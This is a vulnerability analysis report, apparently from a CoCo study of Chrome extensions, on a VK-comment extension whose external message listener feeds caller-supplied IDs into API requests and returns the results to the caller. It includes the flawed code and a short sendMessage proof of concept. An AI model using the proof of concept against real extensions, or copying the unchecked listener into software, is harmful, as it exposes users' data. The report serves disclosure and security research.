# CoCo Analysis: ojhbaaoencoeidckdklfmglkkidmndeb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 6 (variations of same vulnerability with different array indices)

---

## Sink: bg_chrome_runtime_MessageExternal → XMLHttpRequest_url_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ojhbaaoencoeidckdklfmglkkidmndeb/opgen_generated_files/bg.js
Line 966    chain = create_chaine(request.ids_list);
Line 977    'start_comment_id': ids_list[0],
Line 1002   return encodeURIComponent(key) + '=' + encodeURIComponent(dict[key]);
Line 1008   req.open('GET', url + dict_to_uri(data), sync);

(Similar flows for ids_list[1] and ids_list[2])

**Code:**

```javascript
// Background script - External message listener
chrome.extension.onMessageExternal.addListener(function(request, sender, call_back) {
    chain = create_chaine(request.ids_list); // ← attacker-controlled
    call_back({ 'chain': chain[0], 'pid': request.ids_list[1], 'persons': chain[1] });
})

var create_chaine = function(ids_list) {
    var data = {
        'owner_id': '-' + ids_list[2], // ← attacker-controlled
        'post_id': ids_list[1],         // ← attacker-controlled
        'count': 100,
        'sort': 'desc',
        'v': 5.33,
        'start_comment_id': ids_list[0], // ← attacker-controlled
        'extended': 1,
    };
    var url = 'https://api.vk.com/method/wall.getComments?';
    var resp = send_api_request(data, url, false); // ← Sends request with attacker-controlled parameters
    var full_json = JSON.parse(resp).response;
    // ... process response and return to attacker via call_back
    return [chain, persons];
}

var dict_to_uri = function(dict) {
    return Object.keys(dict).map(function(key) {
        return encodeURIComponent(key) + '=' + encodeURIComponent(dict[key]);
    }).join('&');
}

var send_api_request = function(data, url, sync) {
    var req = new XMLHttpRequest();
    req.open('GET', url + dict_to_uri(data), sync); // ← XMLHttpRequest with attacker-controlled parameters
    req.send();
    return req.responseText;
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.extension.onMessageExternal) - The manifest.json allows external messages from vk.com domains and all extensions via "externally_connectable". Per methodology, we ignore manifest restrictions and treat this as exploitable.

**Attack:**

```javascript
// From any website or extension (per methodology: ignore externally_connectable restrictions)
// But even if we respect manifest restrictions, vk.com is whitelisted
chrome.runtime.sendMessage(
    'ojhbaaoencoeidckdklfmglkkidmndeb', // Extension ID
    {
        ids_list: ['123456', '789012', '345678'] // Attacker-controlled IDs
    },
    function(response) {
        // Attacker receives VK API response data
        console.log('VK API data:', response);
        // response contains: { chain: [...], pid: '789012', persons: [...] }
    }
);

// The extension will make a privileged XMLHttpRequest to:
// https://api.vk.com/method/wall.getComments?owner_id=-345678&post_id=789012&count=100&sort=desc&v=5.33&start_comment_id=123456&extended=1

// Attacker can manipulate IDs to:
// 1. Access arbitrary VK posts/comments
// 2. Enumerate private content
// 3. Retrieve data the attacker shouldn't have access to
```

**Impact:** An external attacker can trigger the extension to make arbitrary privileged XMLHttpRequests to the VK API with attacker-controlled parameters. The extension performs these requests with its own privileges and returns the response data back to the attacker via the callback. This allows the attacker to access VK content they shouldn't have access to, enumerate private posts/comments, and potentially abuse the VK API using the extension's context.
